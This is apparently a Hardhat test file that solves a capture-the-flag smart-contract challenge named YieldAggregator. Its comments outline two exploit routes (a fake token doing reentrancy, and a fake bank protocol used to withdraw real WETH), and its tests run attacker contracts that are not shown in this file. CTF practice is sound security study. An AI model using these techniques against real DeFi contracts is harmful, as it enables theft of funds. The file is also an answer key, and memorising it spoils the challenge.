const { expect } = require("chai");

async function getChallenge() {
  const [deployer, player] = await ethers.getSigners();
  const setupFactory = await ethers.getContractFactory(`contracts/yield_aggregator/public/contracts/Setup.sol:Setup`);
  const setup = await setupFactory.deploy({value: ethers.parseEther("100")});
  return { setup, player };
}

// There are 2 solutions to this challenge. Both exploit the fact that `YieldAggregator` does not check for external protocol or tokens.

// 1) Fake a token that performs a reentrancy attack, since the aggregator uses the difference between bank `balance` for keeping track of our
//    tokens.
// 2) Fake a bank protocol. We can pretend to deposit 50 WETH into the fake band, and withdraw from the real one.

it("Solves YieldAggregator 1", async function () {
  const { setup, player } = await getChallenge();

  const attackerFactory = await ethers.getContractFactory(`contracts/yield_aggregator/public/contracts/YieldAggregatorAttacker1.sol:YieldAggregatorAttacker`);
  const attacker = await attackerFactory.connect(player).deploy(await setup.getAddress());
  await attacker.attack({value: ethers.parseEther(`50`)});

  expect(await setup.isSolved()).to.equal(true);
});

it("Solves YieldAggregator 2", async function () {
  const { setup, player } = await getChallenge();

  const attackerFactory = await ethers.getContractFactory(`contracts/yield_aggregator/public/contracts/YieldAggregatorAttacker2.sol:YieldAggregatorAttacker`);
  const attacker = await attackerFactory.connect(player).deploy(await setup.getAddress());
  await attacker.attack({value: ethers.parseEther(`50`)});

  expect(await setup.isSolved()).to.equal(true);
});
